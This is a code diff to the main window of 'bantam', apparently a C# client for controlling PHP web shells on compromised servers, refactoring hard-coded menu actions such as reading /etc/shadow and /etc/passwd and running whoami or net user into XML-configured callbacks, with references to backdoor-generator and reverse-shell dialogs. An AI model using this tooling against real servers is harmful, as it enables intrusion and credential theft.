@@ -4,6 +4,7 @@ using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Threading.Tasks;
+using System.Web.UI.WebControls;
 using System.Windows.Forms;
 
 using bantam.Classes;
@@ -54,6 +55,7 @@ namespace bantam
             //Default UI Component Initialization
             InitializeComponent();
 
+            //todo abstract
             //has to be initialized with parameters manually because, constructor with params breaks design mode...
             txtBoxFileBrowserPath.Initialize(6, 511, 522, 23, "txtBoxFileBrowserPath", this.txtBoxFileBrowserPath_KeyDown, btnFileBrowserBack_MouseClick, 21);
 
@@ -65,6 +67,8 @@ namespace bantam
 
             //setup console input's auto complete source
             textBoxConsoleInput.AutoCompleteCustomSource = consoleTextboxAutoComplete;
+
+            XmlHelper.LoadSettings(AppDomain.CurrentDomain.BaseDirectory + "/settings.xml");
         }
 
         #region HELPER_FUNCTIONS
@@ -418,37 +422,11 @@ namespace bantam
         /// <param name="e"></param>
         private async void pingToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            if (ValidTarget() == false) {
-                return;
-            }
 
-            string shellUrl = SelectedShellUrl;
-            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
-            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;
-
-            ListViewItem lvi = GuiHelper.GetFirstSelectedListview(listViewShells);
-
-            if (lvi != null
-            && (Shells[shellUrl].PingStopwatch == null 
-            || Shells[shellUrl].PingStopwatch.IsRunning == false)) {
-
-                Shells[shellUrl].PingStopwatch = new Stopwatch();
-                Shells[shellUrl].PingStopwatch.Start();
-
-                string phpCode = PhpBuilder.PhpTestExecutionWithEcho1(encryptResponse);
-                string result = await ExecutePHPCode(shellUrl, phpCode, encryptResponse, ResponseEncryptionMode);
-
-                if (string.IsNullOrEmpty(result)) {
-                    return;
-                }
-
-                lvi.SubItems[1].Text = Shells[shellUrl].PingStopwatch.ElapsedMilliseconds.ToString() + " ms";
-                Shells[shellUrl].PingStopwatch.Stop();
-            }
         }
 
         /// <summary>
-        /// 
+        /// Display PHPinfo in Web browser control
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
@@ -655,7 +633,6 @@ namespace bantam
             if (ValidTarget()) {
                 phpToolStripMenuItem.Visible = true;
                 systemToolstripMenuItem.Visible = true;
-                softwareToolStripMenuItem.Visible = true;
 
                 if (Shells[SelectedShellUrl].IsWindows) {
                     linuxToolStripMenuItem.Visible = false;
@@ -667,7 +644,6 @@ namespace bantam
             } else {
                 phpToolStripMenuItem.Visible = false;
                 systemToolstripMenuItem.Visible = false;
-                softwareToolStripMenuItem.Visible = false;
             }
         }
 
@@ -852,7 +828,7 @@ namespace bantam
         }
 
         /// <summary>
-        /// 
+        /// Opens the modify shell dialog with existing shell/connection data
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
@@ -869,7 +845,7 @@ namespace bantam
         }
 
         /// <summary>
-        /// 
+        /// Opens the backdoor generator dialog
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
@@ -880,7 +856,7 @@ namespace bantam
         }
 
         /// <summary>
-        /// 
+        /// Opens the proxy settings dialog
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
@@ -891,7 +867,7 @@ namespace bantam
         }
 
         /// <summary>
-        /// 
+        /// Opens the Shell setting modification dialog
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
@@ -902,7 +878,7 @@ namespace bantam
         }
 
         /// <summary>
-        /// 
+        /// Opens the portscanner dialog
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
@@ -912,22 +888,76 @@ namespace bantam
             ps.ShowDialog();
         }
 
+        /// <summary>
+        /// Opens the distributed port scanner dialog
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void portScannerToolStripMenuItem1_Click(object sender, EventArgs e)
         {
             DistributedPortScanner ds = new DistributedPortScanner();
             ds.ShowDialog();
         }
 
+        /// <summary>
+        /// Opens the reverse shell dialog
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void toolStripMenuItemReverseShell_Click(object sender, EventArgs e)
         {
             ReverseShell reverseShellForm = new ReverseShell(SelectedShellUrl);
             reverseShellForm.ShowDialog();
         }
 
-        private void optionsToolStripMenuItem_Click_1(object sender, EventArgs e)
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void optionsToolStripMenuItem_Click(object sender, EventArgs e)
         {
             Options optionsForm = new Options();
             optionsForm.ShowDialog();
+        }
+
+        /// <summary>
+        /// Retests the ping of the selected shell
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private async void testConnectionToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (ValidTarget() == false)
+            {
+                return;
+            }
+
+            string shellUrl = SelectedShellUrl;
+            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
+            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;
+
+            ListViewItem lvi = GuiHelper.GetFirstSelectedListview(listViewShells);
+
+            if (lvi != null
+            && (Shells[shellUrl].PingStopwatch == null
+            || Shells[shellUrl].PingStopwatch.IsRunning == false))
+            {
+
+                Shells[shellUrl].PingStopwatch = new Stopwatch();
+                Shells[shellUrl].PingStopwatch.Start();
+
+                string phpCode = PhpBuilder.PhpTestExecutionWithEcho1(encryptResponse);
+                string result = await ExecutePHPCode(shellUrl, phpCode, encryptResponse, ResponseEncryptionMode);
+
+                if (string.IsNullOrEmpty(result))
+                {
+                    return;
+                }
+
+                lvi.SubItems[1].Text = Shells[shellUrl].PingStopwatch.ElapsedMilliseconds.ToString() + " ms";
+                Shells[shellUrl].PingStopwatch.Stop();
+            }
         }
 
         #endregion
@@ -1021,7 +1051,7 @@ namespace bantam
         /// </summary>
         /// <param name="result"></param>
         /// <param name="shellUrl"></param>
-        private async Task FileBrowserRender(string result, string shellUrl, TreeNode baseTn = null)
+        private async Task FileBrowserRender(string result, string shellUrl, System.Windows.Forms.TreeNode baseTn = null)
         {
             if (shellUrl != SelectedShellUrl) {
                 LogHelper.AddShellLog(SelectedShellUrl+"/"+ shellUrl, "Detected shell change before filebrowser rendered.", LogHelper.LOG_LEVEL.WARNING);
@@ -1045,7 +1075,7 @@ namespace bantam
                         string permissionOctal = Convert.ToString(Convert.ToInt32(columns[4]), 8);
                         string perms = permissionOctal.Substring(permissionOctal.Length - 4);
 
-                        TreeNodeCollection tnCollection;
+                        System.Windows.Forms.TreeNodeCollection tnCollection;
                         
                         if (baseTn != null && baseTn.Nodes != null) {
                             tnCollection = baseTn.Nodes;
@@ -1055,10 +1085,10 @@ namespace bantam
 
                         //todo cleanup index's and image indexs 
                         if (columns[columns.Length - 2] == "dir") {
-                            TreeNode lastTn = tnCollection.Add("dir", columns[0], 0);
+                            System.Windows.Forms.TreeNode lastTn = tnCollection.Add("dir", columns[0], 0);
                             lastTn.ToolTipText = perms;
                         } else {
-                            TreeNode lastTn = tnCollection.Add("file", columns[0], 1);
+                            System.Windows.Forms.TreeNode lastTn = tnCollection.Add("file", columns[0], 1);
                             if (string.IsNullOrEmpty(columns[2]) == false) {
                                 lastTn.ToolTipText = perms + " - " + Helper.FormatBytes(Convert.ToDouble(columns[2]));
                             } else {
@@ -1180,7 +1210,7 @@ namespace bantam
             bool encryptResponse = Shells[shellUrl].ResponseEncryption;
             int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;
 
-            TreeNode tn = treeViewFileBrowser.SelectedNode;
+            System.Windows.Forms.TreeNode tn = treeViewFileBrowser.SelectedNode;
 
             if (tn != null && tn.Nodes.Count == 0) {
                 string path = tn.FullPath.Replace('\\', '/');
@@ -1393,120 +1423,38 @@ namespace bantam
         #region OS_COMMANDS
 
         /// <summary>
-        /// Shows process list inside of a read-only richtext editor
+        /// 
         /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private void psAuxToolStripMenuItem_Click(object sender, EventArgs e)
+        /// <param name="command"></param>
+        /// <param name="text"></param>
+        /// <param name="is_windows"></param>
+        public void AddOsCommandOptionFromXML(string command, string text, bool is_windows)
         {
+            ToolStripItem toolStripItem;
+
+            if (is_windows) {
+                toolStripItem = this.windowsToolStripMenuItem.DropDownItems.Add(text);
+            } else {
+                toolStripItem = this.linuxToolStripMenuItem.DropDownItems.Add(text);
+            }
+            
+            toolStripItem.Tag = command;
+            toolStripItem.Click += new EventHandler(this.OsCommandCallback);
+        }
+
+        private void OsCommandCallback(object sender, EventArgs e)
+        {
+            ToolStripItem item = (ToolStripItem)sender;
+
+            string command = (string)item.Tag;
             string shellUrl = SelectedShellUrl;
-            bool isWin = Shells[shellUrl].IsWindows;
             bool encrypt = Shells[shellUrl].ResponseEncryption;
             int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;
+            string phpCode = PhpBuilder.ExecuteSystemCode(command, encrypt);
 
-            string cmd = PhpBuilder.TaskListFunction(isWin);
-            string phpCode = PhpBuilder.ExecuteSystemCode(cmd, encrypt);
-
-            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, encrypt, ResponseEncryptionMode);
+            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, command, encrypt, ResponseEncryptionMode);
         }
        
-        /// <summary>
-        /// Issues the windows "net user" command and displays the response
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private void windowsNetuserMenuItem_Click(object sender, EventArgs e)
-        {
-            string shellUrl = SelectedShellUrl;
-            string cmd = PhpBuilder.windowsOS_NetUser;
-            bool encrypt = Shells[shellUrl].ResponseEncryption;
-            string phpCode = PhpBuilder.ExecuteSystemCode(cmd, encrypt);
-            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;
-
-            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, encrypt, ResponseEncryptionMode);
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private void windowsNetaccountsMenuItem_Click(object sender, EventArgs e)
-        {
-            string shellUrl = SelectedShellUrl;
-            string cmd = PhpBuilder.windowsOS_NetAccounts;
-            bool encrypt = Shells[shellUrl].ResponseEncryption;
-            string phpCode = PhpBuilder.ExecuteSystemCode(cmd, encrypt);
-            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;
-
-            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, encrypt, ResponseEncryptionMode);
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private void windowsIpconfigMenuItem_Click(object sender, EventArgs e)
-        {
-            string shellUrl = SelectedShellUrl;
-            string cmd = PhpBuilder.windowsOS_Ipconfig;
-            bool encrypt = Shells[shellUrl].ResponseEncryption;
-            string phpCode = PhpBuilder.ExecuteSystemCode(cmd, encrypt);
-            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;
-
-            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, encrypt, ResponseEncryptionMode);
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private void windowsVerToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            string shellUrl = SelectedShellUrl;
-            string cmd = PhpBuilder.windowsOS_Ver;
-            bool encrypt = Shells[shellUrl].ResponseEncryption;
-            string phpCode = PhpBuilder.ExecuteSystemCode(cmd, encrypt);
-            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;
-
-            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, encrypt, ResponseEncryptionMode);
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private void whoamiToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            string shellUrl = SelectedShellUrl;
-            ShellInfo shell = Shells[shellUrl];
-
-            string cmd = PhpBuilder.posixOS_Whoami;
-            string phpCode = PhpBuilder.ExecuteSystemCode(cmd, shell.ResponseEncryption);
-
-            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, shell.ResponseEncryption, shell.ResponseEncryptionMode);
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private void linuxIfconfigMenuItem_Click(object sender, EventArgs e)
-        {
-            string shellUrl = SelectedShellUrl;
-            string cmd = PhpBuilder.linuxOS_Ifconfig;
-            bool encrypt = Shells[shellUrl].ResponseEncryption;
-            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;
-
-            string phpCode = PhpBuilder.ExecuteSystemCode(cmd, encrypt);
-
-            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, encrypt, ResponseEncryptionMode);
-        }
-
         #endregion
 
         #region READ_COMMON_FILES
@@ -1514,17 +1462,21 @@ namespace bantam
         /// <summary>
         /// 
         /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private void windowsTargetsMenuItem_Click(object sender, EventArgs e)
+        /// <param name="file"></param>
+        /// <param name="text"></param>
+        /// <param name="is_windows"></param>
+        public void AddReadFileOptionFromXML(string file, string text, bool is_windows)
         {
-            string shellUrl = SelectedShellUrl;
-            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
-            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;
+            ToolStripItem toolStripItem;
 
-            string phpCode = PhpBuilder.ReadFileToBase64(PhpBuilder.windowsFS_hostTargets, encryptResponse);
+            if (is_windows) {
+                toolStripItem = this.windowsToolStripMenuItem.DropDownItems.Add(text);
+            } else {
+                toolStripItem = this.linuxToolStripMenuItem.DropDownItems.Add(text);
+            }
 
-            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpBuilder.windowsFS_hostTargets, encryptResponse, ResponseEncryptionMode, true);
+            toolStripItem.Tag = file;
+            toolStripItem.Click += new EventHandler(this.ReadFileOptionCallback);
         }
 
         /// <summary>
@@ -1532,95 +1484,17 @@ namespace bantam
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void linuxInterfacesMenuItem_Click(object sender, EventArgs e)
+        private void ReadFileOptionCallback(object sender, EventArgs e)
         {
+            ToolStripItem item = (ToolStripItem)sender;
+            string file = (string)item.Tag;
+
             string shellUrl = SelectedShellUrl;
             bool encryptResponse = Shells[shellUrl].ResponseEncryption;
             int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;
+            string phpCode = PhpBuilder.ReadFileToBase64(file, encryptResponse);
 
-            string phpCode = PhpBuilder.ReadFileToBase64(PhpBuilder.linuxFS_NetworkInterfaces, encryptResponse);
-
-            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpBuilder.linuxFS_NetworkInterfaces, encryptResponse, ResponseEncryptionMode, true);
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private void linuxVersionMenuItem_Click(object sender, EventArgs e)
-        {
-            string shellUrl = SelectedShellUrl;
-            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
-            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;
-
-            string phpCode = PhpBuilder.ReadFileToBase64(PhpBuilder.linuxFS_ProcVersion, encryptResponse);
-
-            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpBuilder.linuxFS_ProcVersion, encryptResponse, ResponseEncryptionMode, true);
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private void linuxhostsMenuItem_Click(object sender, EventArgs e)
-        {
-            string shellUrl = SelectedShellUrl;
-            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
-            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;
-
-            string phpCode = PhpBuilder.ReadFileToBase64(PhpBuilder.linuxFS_hostTargetsFile, encryptResponse);
-
-            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpBuilder.linuxFS_hostTargetsFile, encryptResponse, ResponseEncryptionMode, true);
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private void linuxIssuenetMenuItem_Click(object sender, EventArgs e)
-        {
-            string shellUrl = SelectedShellUrl;
-            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
-            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;
-
-            string phpCode = PhpBuilder.ReadFileToBase64(PhpBuilder.linuxFS_IssueFile, encryptResponse);
-
-            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpBuilder.linuxFS_IssueFile, encryptResponse, ResponseEncryptionMode, true);
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private void shadowToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            string shellUrl = SelectedShellUrl;
-            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
-            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;
-
-            string phpCode = PhpBuilder.ReadFileToBase64(PhpBuilder.linuxFS_ShadowFile, encryptResponse);
-
-            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpBuilder.linuxFS_ShadowFile, encryptResponse, ResponseEncryptionMode, true);
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private void passwdToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            string shellUrl = SelectedShellUrl;
-            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
-            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;
-
-            string phpCode = PhpBuilder.ReadFileToBase64(PhpBuilder.linuxFS_PasswdFile, Shells[shellUrl].ResponseEncryption);
-
-            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpBuilder.linuxFS_PasswdFile, encryptResponse, ResponseEncryptionMode, true);
+            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, file, encryptResponse, ResponseEncryptionMode, true);
         }
 
         #endregion
